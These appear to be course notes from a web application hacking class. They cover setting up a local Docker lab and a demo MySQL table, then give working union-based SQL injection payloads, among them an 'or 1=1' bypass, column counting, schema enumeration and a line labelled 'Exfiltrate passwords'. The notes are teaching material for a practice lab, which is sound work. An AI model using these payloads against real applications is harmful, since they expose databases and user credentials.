# Find & Exploit Common Web Application Vulnerabilities

### Lab Setup

```
sudo apt update

sudo apt upgrade

sudo apt install docker.io

sudo apt install docker-compose
```

RESTART YOUR VM

Copy the labs to a directory in your system, then open a terminal to that directory

```
tar -xf peh-web-labs.tar.gz

cd labs

sudo docker-compose up
```

The first time it runs, it will need to download some things, it may take a while depending on your 
connection. Next time you run it though, it will be much faster.

Once you see the databases are 'ready for connections' the containers should be ready to go.

The final step is to set some permissions for the webserver, this is needed for the file upload labs and the capstone challenge.

`./set-permissions.sh`

Browse to http://localhost

The first time you load the lab the database will need to be initialized, just follow the instructions in the 
red box by clicking the link, then coming back to the homepage.

Reset lab by navigating to /init.php

### SQL Injection - Introduction

```
# start the mysql service
sudo systemctl start mysql

# login to mysql
sudo mysql

# create the db and tables
CREATE DATABASE sqldemo;
use sqldemo;
CREATE TABLE users (
	username varchar(255),
	password varchar(255),
	age int,
	PRIMARY KEY (username)
);

# insert data into the users table
INSERT INTO users (username,password,age)
VALUES ("jessamy","kittems",31);
```

### SQL injection - UNION

try and force SQL errors with `'` or `"`

Find injection with ojectively true statements `' or 1=1#`

Use union to pull data from tables and columns that aren't part of the SQL query

Union select can only select the same number of columns as the original query

Determine how many columns are being used with `null`:

`jeremy' union select null#`
`jeremy' union select null,null#`
`jeremy' union select null,null,null#`

Query the DB version with a union select:

`jeremy' union select null,null,version()#`

Table names:

`jeremy' union select null,null,table_name from information_schema.tables#`

Column names:

`jeremy' union select null,null,column_name from information_schema.columns#`

Exfiltrate passwords:

`jeremy' union select null,null,password from injection0x01#`

Null's may not work as the type won't match with the column (null is a string)

Use `null(int)` or basic integers instead:

`jeremy' union select null(int),1,password from injection0x01#`

[Portswigger SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### SQL injection - Blind
